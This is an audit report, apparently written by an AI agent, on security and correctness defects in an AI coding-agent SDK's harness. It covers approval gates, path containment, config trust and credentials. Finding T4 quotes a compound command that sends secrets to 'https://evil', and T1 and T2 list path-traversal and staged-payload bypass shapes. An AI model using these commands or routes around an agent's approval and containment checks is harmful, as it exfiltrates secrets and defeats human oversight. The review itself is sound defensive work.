# Audit findings: resolutions-M4-S3

- Subsystems: sdk
- Features: byok-provider-routing, provider-config-loading-merging, config-trust-boundary, model-failover-chains, retry-backoff-policy, chatgpt-oauth-backend, run-orchestration-state, tool-call-dispatch-repair, token-cost-accounting, model-discovery, credentials-oauth-refresh, context-budget-trimming, streaming-callbacks, filesystem-authority, node-filesystem, change-file-transactions, read-policy-containment, terminal-command-policy, run-terminal-command-exec, file-change-hooks, mutation-capabilities, workspace-mutation-broker, workspace-journal, harness-enforcement
- Files covered: 24

## [HIGH] security — sdk/src/provider-config.ts — C1: ancestor openbuff.json route-override precedence
- **Risk:** Ancestor routes/modes/agents can still override project config; M1-T3 closed only the apiKeyEnv-exfiltration half.
- **Fix:** ESCALATED: M1-T3 half ALREADY FIXED (fail-closed stripApiKeyEnvProvidersFromFragment + OPENBUFF_TRUST_ANCESTOR_CONFIG gate + bounded home walk, provider-config.ts:1385-1412,1024-1047). Remaining precedence change (nearest-cwd wins or ancestor-additive-only merge) alters published merge semantics - needs a compat decision plus merge-order regression tests in a follow-up wave.
- **Evidence:** provider-config.ts:1004-1012 still appends ancestor paths after project files; :1413 mergeProviderConfigs later-wins.

## [HIGH] security — sdk/src/run.ts — C2: run_file_change_hooks bypasses approval gate
- **Risk:** Repo-controlled hook commands execute shell with no classify/approval pipeline, unlike run_terminal_command.
- **Fix:** ESCALATED: run.ts:2331-2343 verified still dispatches runFileChangeHooks({files,cwd,env,signal,fileSystem}) with no authorizeHighImpactAction. Requires routing hook commands through classifyTerminalHarnessAction/evaluateHarnessActionPolicy plus trust opt-in; blocked this session - no edit capability available (general-agent spawn rejected by runtime; direct toolset is read-only).
- **Evidence:** run.ts:2331-2343 vs run_terminal_command branch threading authorizeHighImpactAction.

## [HIGH] security — sdk/src/provider-config.ts — C3: project openbuff.json apiKeyEnv has no trust gate
- **Risk:** A cloned repo's own openbuff.json declaring apiKeyEnv sends env secrets to its baseURL with no warning.
- **Fix:** ESCALATED: verified warnIfAncestorConfigHasApiKeyEnv (provider-config.ts:1127-1167) still filters project files out, and resolveConfiguredProviderModel (:1925-1935) accepts any trusted-path apiKeyEnv. Fix needs an OPENBUFF_TRUST_PROJECT_PROVIDERS-style opt-in decision plus schema/diagnostic work; deferred to follow-up wave.
- **Evidence:** provider-config.ts:1140-1145 project files excluded from warning set; :1931 throw only when env var missing.

## [MEDIUM] security — sdk/src/run.ts — C4: browser_logs trusts model-supplied _browserOwner
- **Risk:** Model could claim foreign browser sessions if owner came from tool input.
- **Fix:** ALREADY-RESOLVED (M1-T7): run.ts:2269-2283 now ignores any model-supplied _browserOwner (void _browserOwner) and stamps {...trustedJobOwner, projectRoot: cwd} from trusted runtime state, matching check_job/kill_job/read_logs branches.
- **Evidence:** run.ts:2269-2283 comment 'M1-T7: any model-supplied _browserOwner ... is IGNORED'.

## [MEDIUM] correctness — sdk/src/impl/chatgpt-backend-fetch.ts — C5: tool-call done-args appended on mismatch
- **Risk:** Prefix-mismatch done args used to reassemble previousArguments+doneArguments (malformed JSON).
- **Fix:** ALREADY-RESOLVED (M2-T5): emitDoneArgumentsCorrection (chatgpt-backend-fetch.ts:243-298) now keeps the streamed accumulation on divergence (no append, bounded debug log) and emits only the not-yet-streamed tail on prefix match; both done handlers (:408-438) use it.
- **Evidence:** chatgpt-backend-fetch.ts:268-276 divergent branch returns without emitting; comment cites M2-T5.

## [MEDIUM] correctness — sdk/src/impl/llm.ts — C6: usage lacks cache-write/reasoning split
- **Risk:** BYOK cost telemetry underprices cache writes and hides reasoning spend.
- **Fix:** ESCALATED: sdk/src/impl/llm.ts is HARD FORBIDDEN (conflict hotspot) per task constraints. Requires UsageTokenCounts extension + provider usage mapping + pricing split; route to an llm.ts-owning wave.
- **Evidence:** UsageTokenCounts/computeCostCentsFromUsage unchanged; chatgpt-backend-fetch usage map still forwards only reasoning_tokens.

## [MEDIUM] correctness — sdk/src/run.ts — C7: extractStatusCodeFromMessage bare substring match
- **Risk:** '1500ms' or ids containing 429/500 fabricate public statusCode values.
- **Fix:** ESCALATED: verified run.ts:2627-2690 still uses includes('500')/includes('429')/includes('408'). Fix (anchored regexes + structured-status-first via getErrorStatusCode) is a small pure-function change plus tests, but run.ts edits were unexecutable this session; hand off with the audit's exact regex plan.
- **Evidence:** run.ts:2653-2681 bare includes() checks; no test file references extractStatusCodeFromMessage.

## [MEDIUM] api-contract — sdk/src/impl/failover.ts — C8: content-policy errors failover-eligible
- **Risk:** Policy refusals retried across providers, violating documented failoverModels contract.
- **Fix:** ALREADY-RESOLVED (M3-T4): isFailoverEligibleError (failover.ts:63-101) now returns false for isProviderContentPolicyError with an explicit M3-T4 comment; FAILOVER_ELIGIBLE_STATUS_CODES = 401/403/500/502/503/504 matches the documented contract.
- **Evidence:** failover.ts:76-82 'if (isProviderContentPolicyError(error)) return false'.

## [MEDIUM] error-handling — sdk/src/impl/llm.ts — C9: non-streaming promptAiSdk has zero retries
- **Risk:** One transient 429/5xx fails generateText/generateObject immediately.
- **Fix:** ALREADY-RESOLVED (M3-T4): llm.ts:1913-1915 and :2073-2075 wrap generateText/generateObject in runWithRetryPolicy with the comment 'M3-T4: non-streaming paths retry transient failures exactly like the streaming path'.
- **Evidence:** llm.ts:1913-1923 and 2073-2083 runWithRetryPolicy + withDefaultRequestTimeout.

## [MEDIUM] error-handling — sdk/src/impl/llm.ts — C10: no first-token/stall stream deadlines
- **Risk:** A provider that accepts then stalls hangs the run when runTimeoutMs is unset.
- **Fix:** ESCALATED: partially addressed by M3-T1 withDefaultRequestTimeout (llm.ts:528-541, DEFAULT_LLM_REQUEST_TIMEOUT_MS=600s merged into stream abortSignal at :1200), but granular first-token/inter-chunk deadlines remain and llm.ts is HARD FORBIDDEN this session; escalate granular deadlines to the llm.ts-owning wave.
- **Evidence:** llm.ts:528-541,1197-1200 default timeout present; fullStream iterator still has no per-phase guard.

## [MEDIUM] error-handling — sdk/src/run-state.ts — C11: git hydration unbounded/no timeout
- **Risk:** Wedged git blocks run() indefinitely; huge diffs buffer unboundedly.
- **Fix:** ALREADY-RESOLVED (M3-T1): childProcessToPromise (run-state.ts:264-300) now takes timeoutMs, kills the child and rejects; every getGitChanges command passes GIT_CHANGES_TIMEOUT_MS=5000 (:257,323-353) with existing .catch fallbacks degrading gracefully.
- **Evidence:** run-state.ts:257-278 timeout+kill; :323-353 all four git commands bounded.

## [MEDIUM] error-handling — sdk/src/run.ts — C12: reasoning_chunk forwarded without await
- **Risk:** Rejecting host handleStreamChunk becomes an unhandled rejection.
- **Fix:** ESCALATED: verified run.ts:1016-1022 still calls handleStreamChunk?.({...}) fire-and-forget while siblings await. One-line await fix plus run-handle-event regression test; run.ts edits were unexecutable this session (no edit capability).
- **Evidence:** run.ts:1016-1022 vs awaited handleEvent at :1024.

## [MEDIUM] error-handling — sdk/src/credentials.ts — C13: clearChatGptOAuthCredentials swallows failures
- **Risk:** Failed clear leaves tokens on disk while callers believe disconnect persisted.
- **Fix:** ESCALATED: verified credentials.ts:270-284 still wraps read/delete/write in catch{// Ignore errors}. Changing the void return to a result type is a published-surface change (additive boolean return is safe) plus a warning log; deferred with that exact plan.
- **Evidence:** credentials.ts:276-284 silent catch.

## [MEDIUM] state-mutation — sdk/src/credentials.ts — C14: OAuth refresh single-flight not keyed by config dir
- **Risk:** Concurrent credential stores share one refresh outcome; failure stamp raced.
- **Fix:** ALREADY-RESOLVED (M2-T5): credentials.ts:295-302 now uses chatGptRefreshPromises Map keyed by getConfigDir; refreshKey computed first (:309-319) and the negative cache is stamped inside finally BEFORE the map slot clears (:383-393).
- **Evidence:** credentials.ts:296-298 comment cites M2-T5; :387-392 failure stamped before delete.

## [MEDIUM] state-mutation — sdk/src/provider-config.ts — C15: provider config cache returned by reference
- **Risk:** Consumer in-place mutation poisons every later run in the process.
- **Fix:** ESCALATED: verified loadProviderConfigSync fast path (:1360-1364) still returns providerConfigCache.config by reference. Deep-freeze/clone-on-return is a small fix but touches the hot path and needs a mutation-guard test; deferred with that plan.
- **Evidence:** provider-config.ts:1362-1363 returns cached reference.

## [MEDIUM] test-coverage — sdk/src/impl/__tests__/failover-integration.test.ts — C16: stream retry/failover loop untested (test.skip)
- **Risk:** Loop-level failover regression undetectable.
- **Fix:** ALREADY-RESOLVED: failover-integration.test.ts now contains describe('promptAiSdkStream failover loop (integration)') at :375 with active tests; repo search finds no test.skip or 'TODO: loop-level' remaining in the file.
- **Evidence:** failover-integration.test.ts:375 describe block; zero test.skip matches.

## [MEDIUM] test-coverage — sdk/src/impl/chatgpt-backend-fetch.ts — C17: Responses->ChatCompletions SSE transform untested
- **Risk:** Argument reassembly/finish/usage regressions ship silently.
- **Fix:** ALREADY-RESOLVED: sdk/src/__tests__/chatgpt-backend-fetch.test.ts now has describe('chatgpt backend SSE transform - tool-call argument reassembly') (:82) with matching-tail, identical-repeat, divergent-keep, output_item.done-extension and finish_reason tests (:115-188).
- **Evidence:** chatgpt-backend-fetch.test.ts:82-188 five SSE fixture tests.

## [MEDIUM] dependency-hygiene — sdk/package.json — C18: lodash imported but undeclared
- **Risk:** Standalone @openbuff/sdk install crashes at run() on module-not-found.
- **Fix:** ESCALATED: verified run.ts:35 still imports cloneDeep from lodash (used once at :770) and sdk/package.json dependencies lack it. Preferred fix is replacing cloneDeep with structuredClone (no dependency additions allowed this task; run.ts unexecutable this session). Package.json dependency declaration explicitly deferred per no-new-deps constraint.
- **Evidence:** run.ts:35,770; package.json:60-73 dependencies without lodash.

## [MEDIUM] correctness — sdk/src/impl/llm.ts — C19: repairToolCall echoes malformed input
- **Risk:** Invalid tool args re-dispatched instead of repaired or dropped.
- **Fix:** ESCALATED: sdk/src/impl/llm.ts is HARD FORBIDDEN (conflict hotspot). Real repair pass / null-return semantics plus Zod-validated dispatch inputs belong to the llm.ts-owning wave.
- **Evidence:** llm.ts:1230+ experimental_repairToolCall still pass-through for non-spawn-agent cases.

## [LOW] security — sdk/src/model-discovery.ts — C20: discovery can send API key over non-HTTPS
- **Risk:** discovery.endpoint accepts any URL and auth 'provider' sends the env key in cleartext.
- **Fix:** ESCALATED: verified providerDiscoverySchema (provider-config.ts:106-119) still has unrefined endpoint url() and shouldSendAuthorizationHeader (model-discovery.ts:140-154) returns true unconditionally for auth==='provider'. Fix = https/localhost refine + cross-origin guard mirroring isLocalHttpUrl; deferred with that plan.
- **Evidence:** provider-config.ts:112 endpoint z.string().url() no refine; model-discovery.ts:147 auth==='provider' -> true.

## [LOW] correctness — sdk/src/model-discovery.ts — C21: discovery cache path hardcodes ~/.config/openbuff
- **Risk:** XDG/APPDATA/OPENBUFF_CONFIG_DIR users get an orphaned cache outside their state root.
- **Fix:** ESCALATED: verified getCachePath (model-discovery.ts:79-86) still joins homedir/.config/openbuff. Deriving from getConfigDir() needs a migration note for existing cache files; deferred with that plan.
- **Evidence:** model-discovery.ts:79-86 vs credentials.ts getConfigDir honoring env overrides.

## [LOW] correctness — sdk/src/impl/model-provider.ts — C22: OpenCode Go fallback skips missing-env validation
- **Risk:** Unset apiKeyEnv surfaces as opaque provider 401 instead of actionable error.
- **Fix:** ESCALATED: verified resolveOpenCodeGoResponsesFallback (model-provider.ts:730-771) still sets apiKey: provider.apiKeyEnv ? env[...] : undefined with no throw. Fix reuses the resolveConfiguredProviderModel message format; deferred with that plan.
- **Evidence:** model-provider.ts:765 vs provider-config.ts:1931-1934 standard error.

## [LOW] correctness — sdk/src/impl/chatgpt-backend-fetch.ts — C23: tool results without tool_call_id collapse to 'unknown'
- **Risk:** Duplicate function_call_output call_ids pair outputs to wrong calls.
- **Fix:** ESCALATED: verified convertMessages case 'tool' (chatgpt-backend-fetch.ts:138-148) still emits msg.tool_call_id ?? 'unknown'. Fix = per-message unique id + warning; deferred with that plan.
- **Evidence:** chatgpt-backend-fetch.ts:141 call_id fallback 'unknown'.

## [LOW] api-contract — sdk/src/impl/chatgpt-backend-fetch.ts — C24: backend transform forces reasoning low / verbosity medium
- **Risk:** Configured reasoningEffort routing silently degrades on the ChatGPT OAuth path.
- **Fix:** ESCALATED: verified transformChatGptBackendRequestBody (:207-212) still defaults effort to 'low' and hardcodes verbosity 'medium'; the existing tests (:61-80) assert that behavior, so changing it requires threading providerOptions reasoningEffort through createChatGptBackendFetch plus updated fixtures; deferred with that plan.
- **Evidence:** chatgpt-backend-fetch.ts:207-212; tests codify current default.

## [LOW] correctness — sdk/src/run-state.ts — C25: buildFileTree splits on '/' only
- **Risk:** Windows backslash paths collapse into a single root node.
- **Fix:** ESCALATED: verified run-state.ts:915 still filePath.split('/'). Fix = split(/[\\/]/) after separator normalization; needs a Windows-path tree test; deferred with that plan.
- **Evidence:** run-state.ts:914-918.

## [LOW] correctness — sdk/src/run-state.ts — C26: JSON round-trip clones drop non-JSON values
- **Risk:** withMessageHistory/applyOverridesToSessionState lose Dates/Maps vs structuredClone used elsewhere.
- **Fix:** ESCALATED: verified run-state.ts:773 and :802-804 still JSON.parse(JSON.stringify(...)). Note: applyOverridesToSessionState's JSON clone is deliberately load-bearing (M2-T3 sanitizeAgentStateSecurityMaps re-derives untrusted persisted JSON at that boundary), so the fix is structuredClone in withMessageHistory only plus a documented invariant for the override path; deferred with that nuance.
- **Evidence:** run-state.ts:773,802-804 vs structuredClone at :756.

## [LOW] state-mutation — sdk/src/run.ts — C27: librarian clone cleanup timers leak on early exit
- **Risk:** unref'd 30-min timers never fire when the host exits; /tmp/librarian-* clones persist.
- **Fix:** ESCALATED: verified run.ts:1478-1490 still schedules unref'd per-clone timers with no registry. Fix = module-level timer registry swept at next run start/exit; run.ts unexecutable this session.
- **Evidence:** run.ts:1485-1489 unref'd timers, no clearTimeout.

## [LOW] state-mutation — sdk/src/credentials.ts — C28: saveChatGptOAuthCredentials unlocked read-modify-write
- **Risk:** Concurrent writers drop each other's keys (chatgptOAuth vs default).
- **Fix:** ESCALATED: verified credentials.ts:240-268 still does unlocked read-spread-atomic-write. Fix = per-path write mutex queue with re-read inside the critical section; deferred with that plan.
- **Evidence:** credentials.ts:249-267.

## [LOW] performance — sdk/src/provider-config.ts — C29: cache-key construction re-parses fragments every call
- **Risk:** Synchronous disk+JSON work on every LLM request before the memo check.
- **Fix:** ESCALATED: verified buildProviderConfigCacheKey (:1308-1340) still resolves dependency paths (which re-read/parse fragments in collectProviderConfigDependencyPaths :1217-1219) before the cache hit check. Stat-only memo of the dependency list needs careful invalidation semantics; deferred with the audit's stat-tuple plan.
- **Evidence:** provider-config.ts:1324-1327 resolveProviderConfigDependencyPaths before cache hit; :1219 JSON.parse per file.

## [LOW] performance — sdk/src/impl/model-provider.ts — C30: findProviderVisionFallback rescans per request
- **Risk:** O(providers^2 * models) full resolution per image request.
- **Fix:** ESCALATED: verified nested loops at model-provider.ts:567-607 call resolveConfiguredProviderModel + getModelVisionSupport per candidate on every image request. Per-config memo keyed by loaded-config identity; deferred with that plan.
- **Evidence:** model-provider.ts:582-601 nested resolution loops.

## [LOW] correctness — sdk/src/client.ts — C31: default fingerprintId uses Math.random
- **Risk:** Weak/unstable identity for session affinity and cost attribution.
- **Fix:** ESCALATED: verified client.ts:21 still Math.random().toString(36). One-line crypto.randomUUID() change matching getTrustedSessionClientId plus client.test.ts assertion; deferred with that plan.
- **Evidence:** client.ts:21.

## [LOW] error-handling — sdk/src/run.ts — C32: handleToolCall leaks raw error.message to model context
- **Risk:** Internal paths/config details reach conversation and providers.
- **Fix:** ESCALATED: verified the catch block (run.ts handleToolCall) still wraps error.message verbatim. Fix = sanitizeErrorMessage (already exported from error-utils.ts:213) at this boundary + error-code taxonomy; run.ts unexecutable this session.
- **Evidence:** run.ts handleToolCall catch; sanitizeErrorMessage exists unused here.

## [HIGH] security — sdk/src/tools/terminal-command-policy.ts — T1: lexical /usr/bin, /bin, /dev/null prefix skips defeat containment
- **Risk:** Tokens like /usr/bin/../../../etc/shadow bypass the outside-path gate before resolution.
- **Fix:** ESCALATED: verified terminal-command-policy.ts:2033-2034 and :2079-2080 still skip on raw startsWith before path.resolve (:2035,:2082). Fix = resolve-then-compare against resolved allowlist prefixes; security-critical, needs the audit's regression tests (/usr/bin/../../etc/passwd, /dev/null/../../x); blocked this session (no edit capability).
- **Evidence:** terminal-command-policy.ts:2033-2035,2079-2082.

## [HIGH] security — sdk/src/tools/filesystem-authority.ts — T2: owned-temp executable refusal bypassable via extension-less/multi-dot names
- **Risk:** /tmp/payload or /tmp/x.js.txt can be staged and executed via node/python3/bash.
- **Fix:** ESCALATED: verified ownedTempMutationRefusal (filesystem-authority.ts:775-788) still checks only final path.extname of basename/normalizedBasename. Fix = refuse any dot-suffix in the refused set plus extension-less basenames outside harness mkdtemp layouts; blocked this session.
- **Evidence:** filesystem-authority.ts:777-782 extname-only checks; OWNED_TEMP_REFUSED_EXTENSIONS :86-113.

## [MEDIUM] security — sdk/src/tools/run-terminal-command.ts — T3: approved git commit re-enters as mode 'user', skipping staged-diff scan
- **Risk:** Post-approval commit bypasses validateStagedCommit and can commit key material.
- **Fix:** ESCALATED: verified run.ts runTerminalCommand:379-383 still gates validateStagedCommit on mode==='assistant' and the approval path recurses with mode:'user' (:347-360). Fix = decouple scan from mode (gate on permission_profile==='git-commit' && commit regex) and add a re-entry regression test; blocked this session.
- **Evidence:** run-terminal-command.ts:379-383 mode gate; :347-352 mode:'user' re-entry.

## [MEDIUM] security — sdk/src/services/harness-enforcement.ts — T4: classifier accepts compound commands as simple push
- **Risk:** One push approval authorizes 'git push origin main && curl -T secrets https://evil'.
- **Fix:** ESCALATED: verified normalizeCommand (:133-135) folds whitespace and the push matcher (:148) treats all trailing tokens as args; no compound guard exists before :148. Fix = quote-aware unquoted ;|&&|| newline $( backtick guard returning undefined at classifier top plus compound/quoted regression tests; blocked this session.
- **Evidence:** harness-enforcement.ts:133-135,144-148.

## [MEDIUM] security — sdk/src/tools/read-policy.ts — T5: isReadPathBlocked matches non-normalized spellings
- **Risk:** './x', 'a//b', 'foo/../secret.ts' aliases dodge fileFilter/sensitive-path rules.
- **Fix:** ESCALATED: verified read-policy.ts:5-18 still only backslash-normalizes and lowercases. Fix = segment normalization (drop '.', resolve '..', collapse separators, win32 trailing-dot strip) before matching, mirroring win32NormalizeSegments; blocked this session.
- **Evidence:** read-policy.ts:9-10.

## [MEDIUM] security — sdk/src/tools/file-change-hooks.ts — T6: auto-inferred hooks execute repository package scripts
- **Risk:** Malicious repo gains code execution on first file edit via package.json lint/typecheck scripts.
- **Fix:** ESCALATED: verified inferPackageJsonHooks (:241-286) still prefers `${packageRunner} run ${script}` over the direct-binary fallback and runFileChangeHooks (:700-723) wires no approval. Fix = make script: hooks opt-in / prefer localPackageExecutableCommand and treat script hooks as high-impact in classify; blocked this session.
- **Evidence:** file-change-hooks.ts:257-262,271-276 script-run hooks; :713-715 comment contradicted.

## [MEDIUM] security — sdk/src/services/workspace-mutation-broker.ts — T7: broker path resolution checks only parent realpath
- **Risk:** Final-component symlink makes CAS hashes read out-of-tree bytes.
- **Fix:** ESCALATED: verified resolvePath (:846-871) realpaths only the parent and readHash (:902-909) follows final symlinks via fs.readFile. Fix = lstat final component / O_NOFOLLOW hashing matching filesystem-authority policy; blocked this session.
- **Evidence:** workspace-mutation-broker.ts:860-866,902-909.

## [MEDIUM] correctness — sdk/src/tools/mutation-capabilities.ts — T8: capability endLine off-by-one for trailing-newline files
- **Risk:** endLine=2 for 'a\n' while readNodeTextRange reports totalLines=1; anchors drift at EOF.
- **Fix:** ESCALATED: verified mutation-capabilities.ts:47,69 still use normalizeLineEndings(content).split('\n').length. Fix = shared line-count helper subtracting 1 for trailing newline, used by both builders, with a 'a\n' regression test; blocked this session.
- **Evidence:** mutation-capabilities.ts:47,69.

## [MEDIUM] correctness — sdk/src/services/harness-enforcement.ts — T9: approval consume check-then-put race
- **Risk:** Two concurrent consumes can double-spend one approval.
- **Fix:** ALREADY-RESOLVED (lock-reclaim wave): consume (harness-enforcement.ts:63-109) now wraps the entire read-check-put in store.withKindLock(repositoryId,'approvals',...) with an explanatory race-fix comment, matching workspace-journal.advance's pattern.
- **Evidence:** harness-enforcement.ts:72-108 withKindLock wrapping.

## [MEDIUM] correctness — sdk/src/tools/change-file.ts — T10: STALE_STATE thrown as plain Error, re-coded retryable io_error
- **Risk:** Stale-state conflicts reported as blind-retry I/O errors; junk receipt codes from error.name.
- **Fix:** ESCALATED: verified commitPreparedTransactionChange (:965-1026) still throws new Error('STALE_STATE: ...') at :978-982,:995-999,:1018-1022 and finishCommit derives errorCode from error.name.toUpperCase() (:1483-1486). Fix = MutationApplicationError(filesystemError('stale_state',{requiresFreshRead,recovery:'read_again'})) + structured errorCode; blocked this session.
- **Evidence:** change-file.ts:978,996,1019; :1483-1486 name-derived code.

## [MEDIUM] state-mutation — sdk/src/tools/change-file.ts — T11: preparation exceptions escape without cancelling operation
- **Risk:** UNSUPPORTED_BINARY/stat throws leave authority operations stuck 'open' forever.
- **Fix:** ESCALATED: verified readOptionalText throws bare Error (:816-820), prepareTransactionChange has no catch, and the mapWithConcurrency loop (:407-427) only cancels on result.ok===false. Fix = try/catch converting preparation failures to {ok:false,error} results + guaranteed authority.cancel on every exit; blocked this session.
- **Evidence:** change-file.ts:816-820,407-427.

## [MEDIUM] state-mutation — sdk/src/tools/filesystem-authority.ts — T12: default authority cache never evicts on fresh policy objects
- **Risk:** Per-call policy closures leak authorities/receipts and lose lock continuity.
- **Fix:** ESCALATED: verified getDefaultFilesystemAuthority (:964-1025) still matches entries by fileFilter/filesystemPolicy identity with unbounded entries.push. Fix = stable policy identity key or LRU cap with documented semantics; blocked this session.
- **Evidence:** filesystem-authority.ts:977-982,1022-1023.

## [MEDIUM] error-handling — sdk/src/services/workspace-mutation-broker.ts — T13: corrupt pending receipt bricks the broker
- **Risk:** One truncated pending file makes every conditionalCommit/Delete/Move throw raw SyntaxError.
- **Fix:** ESCALATED: verified recoverPendingReceipts (:659-676) reads every pending receipt with no try/catch while listReceipts (:530-540) tolerates SyntaxError. Fix = quarantine to <name>.corrupt + WorkspaceMutationBrokerRecoveryError naming the file; blocked this session.
- **Evidence:** workspace-mutation-broker.ts:666 unguarded readJson vs :538 SyntaxError tolerance.

## [MEDIUM] error-handling — sdk/src/tools/run-terminal-command.ts — T14: validateStagedCommit spawnSync calls have no timeout
- **Risk:** Wedged git blocks the entire Node event loop indefinitely.
- **Fix:** ESCALATED: verified runGit closure (:38-43) passes cwd/encoding/maxBuffer with no timeout across three sequential spawnSync calls. Fix = timeout+killSignal options treating timeout as a safety failure; blocked this session.
- **Evidence:** run-terminal-command.ts:38-43.

## [MEDIUM] performance — sdk/src/tools/change-file.ts — T15: transaction byte caps enforced only after full reads
- **Risk:** Multi-GB targets OOM before validatePreparedTransactionResources rejects.
- **Fix:** ESCALATED: verified validatePreparedTransactionResources runs at :428 after prepare already read every file via readOptionalText. Fix = stat-first rejection + incremental byte accounting during prepare; blocked this session.
- **Evidence:** change-file.ts:407-428.

## [MEDIUM] test-coverage — sdk/src/services/workspace-journal.ts — T16: workspace-journal.ts has zero test coverage
- **Risk:** CAS conflicts, fallback state and corrupt records untested.
- **Fix:** ESCALATED: verified the 100-line service (:1-100) has read()/advance() with withKindLock and no __tests__ reference. Test plan from the audit stands (temp LocalHarnessStore: concurrent advance conflicts, first-write revision 0, missing-record fallback, malformed updatedAt typed error); blocked this session.
- **Evidence:** workspace-journal.ts:52-99; no test file references WorkspaceJournalService.

## [LOW] security — sdk/src/services/harness-enforcement.ts — T17: ownership path validation only rejects '..'
- **Risk:** Absolute, win32 and control-char paths recorded into durable receipts.
- **Fix:** ESCALATED: verified ChangeOwnershipService.record (:282-289) checks only empty/includes('..'). Fix = reject path.isAbsolute, /^[A-Za-z]:[/\\]/, control chars, and normalize separators before the '..' check; blocked this session.
- **Evidence:** harness-enforcement.ts:283-284.

## [LOW] security — sdk/src/tools/terminal-command-policy.ts — T18: workspace env-dump scan fails open on unparseable segments
- **Risk:** Parser gaps become secret-dump channels instead of denials.
- **Fix:** ESCALATED: verified findProcessEnvironmentIssueInCommand (:642-653): when collectEnvDumpScanPieces returns undefined and splitReadOnlyShellSegments also returns undefined, the function returns undefined even for printenv/env/export commands. Fix = fail closed returning the env-dump reason when ENV_DUMP_UTILITY_PATTERN matches (:45); blocked this session.
- **Evidence:** terminal-command-policy.ts:646-651 vs fail-closed :663-667.

## [LOW] security — sdk/src/tools/run-terminal-command.ts — T19: listDirtyPaths does not unquote git porcelain paths
- **Risk:** Quoted/escaped filenames are dropped from touchedPaths attribution.
- **Fix:** ESCALATED: verified listDirtyPaths (:175-197) slices line.slice(3) with only backslash/'./' normalization. Fix = C-style quote/escape decoding (\xNN, \n, \t) before normalization + fixture with quote/tab/non-ASCII name; blocked this session.
- **Evidence:** run-terminal-command.ts:187-192.

## [LOW] correctness — sdk/src/services/workspace-mutation-broker.ts — T20: stale-lock recovery trusts bare pid liveness
- **Risk:** Pid reuse or shared stateDir wedges the broker permanently.
- **Fix:** ESCALATED: verified canRecoverLock (:621-638) recovers only when !isProcessAlive(owner.pid) and LockOwner (:87-92) carries no hostname/start-time. Fix = record host id + process start time, treat cross-host or pid-only matches as stale after staleLockMs; blocked this session.
- **Evidence:** workspace-mutation-broker.ts:629-637,87-92.

## [LOW] error-handling — sdk/src/tools/change-file.ts — T21: real commit failures mislabeled 'cancelled' when signal aborted
- **Risk:** I/O failures swallowed into cancel semantics during abort windows.
- **Fix:** ESCALATED: verified applyChange catch (:1533-1542) keys the code on signal?.aborted regardless of cause. Fix = classify 'cancelled' only for AbortError/abort-reason throws; blocked this session.
- **Evidence:** change-file.ts:1536-1541.

## [LOW] error-handling — sdk/src/tools/run-terminal-command.ts — T22: negative timeout_seconds grants unbounded sync runs
- **Risk:** Stuck child occupies a tool slot forever with only the abort signal as escape.
- **Fix:** ESCALATED: verified :556-561 sets the timer only when timeout_seconds >= 0 with no ceiling or unbounded telemetry. Fix = clamp to a finite harness maximum or require an explicit sentinel plus surfaced flag; blocked this session.
- **Evidence:** run-terminal-command.ts:556-561.

## [LOW] performance — sdk/src/tools/file-change-hooks.ts — T23: dotnet discovery N+1 stats and repeated manifest scans
- **Risk:** Per-edit verification latency from sequential stats and full re-inference.
- **Fix:** ESCALATED: verified findDotnetTargetInFileSystem awaits fs.stat per entry serially and collectManifestSnapshot re-stats/reads every call. Fix = readdir withFileTypes + bounded-batch stats + mtime-keyed memo; blocked this session.
- **Evidence:** file-change-hooks.ts dotnet walk + collectManifestSnapshot.

## [LOW] performance — sdk/src/services/workspace-mutation-broker.ts — T24: readHash buffers entire files per CAS compare
- **Risk:** Multi-GB targets allocate unboundedly on the serialized lock hot path.
- **Fix:** ESCALATED: verified readHash (:902-909) uses fs.readFile + exactHash with no size ceiling. Fix = streaming hash + typed resource_limit cap; blocked this session.
- **Evidence:** workspace-mutation-broker.ts:904.

## [LOW] dependency-hygiene — sdk/src/tools/run-terminal-command.ts — T25: cross-package relative imports from common's src tree
- **Risk:** Coupling to common's source layout bypasses package export boundaries.
- **Fix:** ESCALATED: verified :6-9 and :28 import '../../../common/src/util/string' and '../../../common/src/tools/list' while sibling files use '@codebuff/common/*'. Fix = switch to the package alias; blocked this session (mechanical but touched-file edits unavailable).
- **Evidence:** run-terminal-command.ts:6-9,28.

## [LOW] test-coverage — sdk/src/services/harness-enforcement.ts — T26: no classifier compound-command or approval double-spend tests
- **Risk:** The two approval-boundary defects could silently return.
- **Fix:** ESCALATED: pairs with T4/T9. consume() is now lock-serialized (T9 ALREADY-RESOLVED) but no concurrent-consume or compound-command regression tests exist in harness-enforcement.test.ts; add them alongside the T4 fix in the follow-up wave.
- **Evidence:** harness-enforcement.test.ts covers happy paths only.

## [LOW] test-coverage — sdk/src/tools/filesystem-authority.ts — T27: no owned-temp refusal tests for bypass shapes
- **Risk:** Future narrowing of OWNED_TEMP_REFUSED_EXTENSIONS passes CI while reopening staged-script execution.
- **Fix:** ESCALATED: pairs with T2. Add authorizePath owned-temp cases: extension-less 'payload', multi-dot 'x.js.txt', win32 alias 'payload.sh ', and delete-of-executable staying allowed; blocked this session.
- **Evidence:** filesystem-authority.test.ts lacks owned-temp refusal cases.

## [LOW] api-contract — sdk/src/tools/node-filesystem.ts — T28: synthetic EEXIST error shape and dropped expectedDestinationHash
- **Risk:** Error-shape consumers keyed on err.path/syscall break; future non-null destination expectations silently ignored.
- **Fix:** ESCALATED: verified createFileExclusive wrapper (:74-83) assigns only code:'EEXIST' and conditionalMove (:48-57) forwards only expectedSourceHash. Fix = full Node fs error shape + throw on non-null expectedDestinationHash; blocked this session.
- **Evidence:** node-filesystem.ts:74-83,48-57.

## [LOW] api-contract — sdk/src/tools/run-terminal-command.ts — T29: run_terminal_command result shape untyped, touchedPaths cast
- **Risk:** Six ad-hoc value shapes with no discriminated schema; field drift invisible.
- **Fix:** ESCALATED: verified withTouchedPaths double-cast and ad-hoc value construction. Fix requires a discriminated schema in @codebuff/common/tools/list - OUT OF SCOPE (common/src/** is HARD FORBIDDEN); escalate to a common-package wave with sdk-side typed builder as phase 2.
- **Evidence:** run-terminal-command.ts:705-716 area; common schema edit required.

## Coverage receipt

### Subsystems
- sdk

### Features
- byok-provider-routing
- provider-config-loading-merging
- config-trust-boundary
- model-failover-chains
- retry-backoff-policy
- chatgpt-oauth-backend
- run-orchestration-state
- tool-call-dispatch-repair
- token-cost-accounting
- model-discovery
- credentials-oauth-refresh
- context-budget-trimming
- streaming-callbacks
- filesystem-authority
- node-filesystem
- change-file-transactions
- read-policy-containment
- terminal-command-policy
- run-terminal-command-exec
- file-change-hooks
- mutation-capabilities
- workspace-mutation-broker
- workspace-journal
- harness-enforcement

### Files
- sdk/src/client.ts
- sdk/src/run.ts
